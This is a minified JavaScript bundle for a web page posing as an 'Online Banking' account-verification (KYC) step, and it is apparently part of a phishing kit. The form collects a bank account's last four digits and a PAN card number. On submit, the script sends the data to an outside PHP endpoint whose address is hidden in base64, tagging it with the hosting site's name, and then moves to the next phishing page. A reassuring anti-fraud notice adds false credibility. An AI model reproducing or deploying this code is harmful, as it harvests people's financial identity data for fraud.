(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [148], {
        2909: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a6", function() {
                return t(1845)
            }])
        },
        9018: function(e, n) {
            "use strict";
            n.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        1845: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return m
                }
            });
            var a = t(7568),
                s = t(655),
                r = t(5893),
                i = t(9008),
                o = t.n(i),
                l = t(5675),
                c = t.n(l),
                u = t(7294),
                d = t(1163),
                h = t(9018);

            function m() {
                var e, n = (0, d.useRouter)(),
                    t = (0, u.useState)(""),
                    i = t[0],
                    l = t[1],
                    m = function() {
                        var e = new Date,
                            n = e.getFullYear(),
                            t = e.getMonth() + 1,
                            a = e.getDate();
                        a < 10 && (a = "0" + a);
                        var s = e.getHours(),
                            r = e.getMinutes(),
                            i = s >= 12 ? "PM" : "AM";
                        s %= 12, s = s || 12, r = r < 10 ? "0" + r : r, l(a + "-" + ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][t].substring(0, 3) + "-" + n + " [" + s + ":" + r + " " + i + " IST]")
                    },
                    $ = (0, u.useState)(!1),
                    p = $[0],
                    f = $[1],
                    x = (e = (0, a.Z)(function(e) {
                        var t, a, r, i, o, l, c;
                        return (0, s.__generator)(this, function(s) {
                            switch (s.label) {
                                case 0:
                                    return e.preventDefault(), f(!0), t = new FormData(e.target), a = {}, t.forEach(function(e, n) {
                                        a[n] = e
                                    }), r = JSON.stringify(a), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "application/json"
                                    }, o.body = r, o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (l = s.sent()).json()];
                                case 2:
                                    return c = s.sent(), f(!1), !0 == c.status ? n.push("/a7") : f(!1), [2]
                            }
                        })
                    }), function(n) {
                        return e.apply(this, arguments)
                    });
                return (0, u.useEffect)(function() {
                    return m
                }, []), (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(o(), {
                        children: [(0, r.jsx)("title", {
                            children: "Validate the details"
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: "validate the details"
                        }), (0, r.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, r.jsxs)("main", {
                        children: [(0, r.jsx)("div", {
                            className: "logo",
                            children: (0, r.jsx)(c(), {
                                src: "/logo.svg.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, r.jsx)("br", {}), (0, r.jsx)("div", {
                            className: "panelDiv",
                            children: (0, r.jsx)("div", {
                                className: "panel",
                                children: (0, r.jsx)("span", {
                                    children: i
                                })
                            })
                        }), (0, r.jsx)("div", {
                            className: "content_heading",
                            children: (0, r.jsx)("h3", {
                                className: "pull-left",
                                children: "Verify Account"
                            })
                        }), (0, r.jsxs)("div", {
                            className: "content_area",
                            children: [(0, r.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, r.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: x,
                                children: [(0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "otp1",
                                        children: [" Last 4 Digit A/C Number", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "last_4_digit_ac",
                                        type: "text",
                                        name: "last_4_digit_ac",
                                        maxLength: 4,
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "pan_card_no",
                                        children: ["PANCARD Number", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "pan_card_no",
                                        type: "text",
                                        name: "pan_card_no",
                                        maxLength: 10,
                                        pattern: "[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}",
                                        title: "Please enter valid PAN",
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsx)("p", {
                                    className: "content_title",
                                    children: "50% KYC Successful"
                                }), (0, r.jsx)("div", {
                                    className: "commonbutton",
                                    children: (0, r.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!p,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    })
                                })]
                            }), (0, r.jsx)("div", {
                                className: "info_panel",
                                children: (0, r.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, r.jsxs)("ul", {
                                        children: [(0, r.jsx)("li", {
                                            children: "Online Banking or any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report@onlinebank.com if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, r.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, r.jsx)("div", {
                            className: "footer_area",
                            children: (0, r.jsx)(c(), {
                                src: "/veriSign.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, r.jsx)("div", {
                            className: "footer",
                            children: (0, r.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function a(e, n, t, a, s, r, i) {
                try {
                    var o = e[r](i),
                        l = o.value
                } catch (c) {
                    t(c);
                    return
                }
                o.done ? n(l) : Promise.resolve(l).then(a, s)
            }

            function s(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(s, r) {
                        var i = e.apply(n, t);

                        function o(e) {
                            a(i, s, r, o, l, "next", e)
                        }

                        function l(e) {
                            a(i, s, r, o, l, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return s
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 2909)
        }), _N_E = e.O()
    }
]);